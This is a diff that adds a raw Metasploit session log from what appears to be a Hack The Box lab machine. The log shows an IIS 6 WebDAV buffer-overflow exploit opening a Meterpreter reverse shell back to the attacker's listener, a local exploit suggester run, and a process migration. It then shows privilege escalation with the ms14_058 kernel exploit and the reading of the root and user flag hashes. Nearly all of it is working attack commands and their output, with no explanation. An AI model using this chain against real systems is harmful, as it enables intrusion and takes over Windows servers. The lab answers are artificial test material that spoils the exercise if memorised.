@@ -347,3 +347,292 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 [*] Trying path length 3 to 60 ...
 [*] Exploit completed, but no session was created.
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > 
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.14:1030) at 2021-01-26 19:22:06 +0800
+
+
+
+meterpreter > 
+meterpreter > 
+meterpreter > 
+
+meterpreter > getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+
+
+meterpreter > cd Administrator
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+meterpreter > cd Harry
+[-] stdapi_fs_chdir: Operation failed: Access is denied.
+
+
+
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 34 exploit checks are being tried...
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > back
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > 
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:6969 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 5555
+lport => 5555
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:5555 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+
+
+
+
+meterpreter > cd %temp%
+meterpreter > pwd
+C:\WINDOWS\TEMP
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
+   LPORT     5555             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:5555 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 272   4     smss.exe                                                        
+ 324   272   csrss.exe                                                       
+ 348   272   winlogon.exe                                                    
+ 396   348   services.exe                                                    
+ 408   348   lsass.exe                                                       
+ 612   396   svchost.exe                                                     
+ 684   396   svchost.exe                                                     
+ 740   396   svchost.exe                                                     
+ 768   396   svchost.exe                                                     
+ 804   396   svchost.exe                                                     
+ 940   396   spoolsv.exe                                                     
+ 968   396   msdtc.exe                                                       
+ 1088  396   cisvc.exe                                                       
+ 1128  396   svchost.exe                                                     
+ 1184  396   inetinfo.exe                                                    
+ 1224  396   svchost.exe                                                     
+ 1324  396   VGAuthService.exe                                               
+ 1412  396   vmtoolsd.exe                                                    
+ 1460  396   svchost.exe                                                     
+ 1600  396   svchost.exe                                                     
+ 1692  1088  cidaemon.exe                                                    
+ 1792  396   alg.exe                                                         
+ 1808  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1920  396   dllhost.exe                                                     
+ 2180  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2248  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2300  2180  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 2316  1088  cidaemon.exe                                                    
+ 2340  1088  cidaemon.exe                                                    
+ 2488  612   wmiprvse.exe                                                    
+ 2900  348   logon.scr                                                       
+ 3100  1460  w3wp.exe                                                        
+ 3676  612   davcdata.exe                                                    
+
+meterpreter > migrate 1808
+[*] Migrating from 2300 to 1808...
+[*] Migration completed successfully.
+meterpreter > 
+
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:5555 
+[*] Launching notepad to host the exploit...
+[+] Process 3060 launched.
+[*] Reflectively injecting the exploit DLL into 3060...
+[*] Injecting exploit into 3060...
+[*] Exploit injected. Injecting payload into 3060...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.14.15:5555 -> 10.10.10.14:1032) at 2021-01-26 19:47:34 +0800
+
+meterpreter > 
+
+
+
+
+
+
+
+
+meterpreter > dir
+Listing: C:\
+============
+
+Mode                Size               Type  Last modified                    Name
+----                ----               ----  -------------                    ----
+40777/rwxrwxrwx     0                  dir   2017-04-12 22:27:12 +0800        ADFS
+100777/rwxrwxrwx    0                  fil   2017-04-12 22:04:44 +0800        AUTOEXEC.BAT
+100666/rw-rw-rw-    0                  fil   2017-04-12 22:04:44 +0800        CONFIG.SYS
+40777/rwxrwxrwx     0                  dir   2017-04-12 21:42:38 +0800        Documents and Settings
+40777/rwxrwxrwx     0                  dir   2017-04-12 22:17:24 +0800        FPSE_search
+100444/r--r--r--    0                  fil   2017-04-12 22:04:44 +0800        IO.SYS
+40777/rwxrwxrwx     0                  dir   2017-04-12 22:16:33 +0800        Inetpub
+100444/r--r--r--    0                  fil   2017-04-12 22:04:44 +0800        MSDOS.SYS
+100555/r-xr-xr-x    47772              fil   2007-02-18 20:00:00 +0800        NTDETECT.COM
+40555/r-xr-xr-x     0                  dir   2017-04-12 21:43:02 +0800        Program Files
+40777/rwxrwxrwx     0                  dir   2017-04-12 21:42:38 +0800        System Volume Information
+40777/rwxrwxrwx     0                  dir   2017-04-12 21:41:07 +0800        WINDOWS
+100666/rw-rw-rw-    208                fil   2017-04-12 21:42:08 +0800        boot.ini
+100444/r--r--r--    297072             fil   2007-02-18 20:00:00 +0800        ntldr
+65201544/r-xr--r--  54039570576080879  fif   1721450128-01-06 01:12:32 +0800  pagefile.sys
+40777/rwxrwxrwx     0                  dir   2017-04-12 22:05:06 +0800        wmpub
+
+meterpreter > cd "Documents and Settings"
+meterpreter > dir
+Listing: C:\Documents and Settings
+==================================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40777/rwxrwxrwx  0     dir   2017-04-12 22:12:15 +0800  Administrator
+40777/rwxrwxrwx  0     dir   2017-04-12 21:42:38 +0800  All Users
+40777/rwxrwxrwx  0     dir   2017-04-12 21:42:38 +0800  Default User
+40777/rwxrwxrwx  0     dir   2017-04-12 22:32:01 +0800  Harry
+40777/rwxrwxrwx  0     dir   2017-04-12 22:08:32 +0800  LocalService
+40777/rwxrwxrwx  0     dir   2017-04-12 22:08:31 +0800  NetworkService
+
+meterpreter > cd Administrator
+meterpreter > dir
+Listing: C:\Documents and Settings\Administrator
+================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Application Data
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Cookies
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Desktop
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Favorites
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Local Settings
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  My Documents
+100666/rw-rw-rw-  786432  fil   2017-04-12 22:12:15 +0800  NTUSER.DAT
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  NetHood
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  PrintHood
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Recent
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  SendTo
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Start Menu
+100666/rw-rw-rw-  0       fil   2017-04-12 22:12:15 +0800  Sti_Trace.log
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Templates
+100666/rw-rw-rw-  1024    fil   2017-04-12 22:12:15 +0800  ntuser.dat.LOG
+100666/rw-rw-rw-  178     fil   2017-04-12 22:12:15 +0800  ntuser.ini
+
+meterpreter > cd Desktop
+meterpreter > di
+[-] Unknown command: di.
+meterpreter > dir
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 22:28:50 +0800  root.txt
+
+meterpreter > cat root.txt
+9359e905a2c35f861f6a57cecf28bb7bmeterpreter > cd ..
+meterpreter > cd Harry\Desktop
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > cd Harry
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > dir
+Listing: C:\Documents and Settings\Administrator
+================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Application Data
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Cookies
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Desktop
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Favorites
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Local Settings
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  My Documents
+100666/rw-rw-rw-  786432  fil   2017-04-12 22:12:15 +0800  NTUSER.DAT
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  NetHood
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  PrintHood
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Recent
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  SendTo
+40555/r-xr-xr-x   0       dir   2017-04-12 22:12:15 +0800  Start Menu
+100666/rw-rw-rw-  0       fil   2017-04-12 22:12:15 +0800  Sti_Trace.log
+40777/rwxrwxrwx   0       dir   2017-04-12 22:12:15 +0800  Templates
+100666/rw-rw-rw-  1024    fil   2017-04-12 22:12:15 +0800  ntuser.dat.LOG
+100666/rw-rw-rw-  178     fil   2017-04-12 22:12:15 +0800  ntuser.ini
+
+meterpreter > cd ..
+meterpreter > cd Harry
+meterpreter > cd Desktop
+meterpreter > dir
+Listing: C:\Documents and Settings\Harry\Desktop
+================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 22:32:09 +0800  user.txt
+
+meterpreter > cat user.txt
+bdff5ec67c3cff017f2bedc146a5d869meterpreter > 
+
+
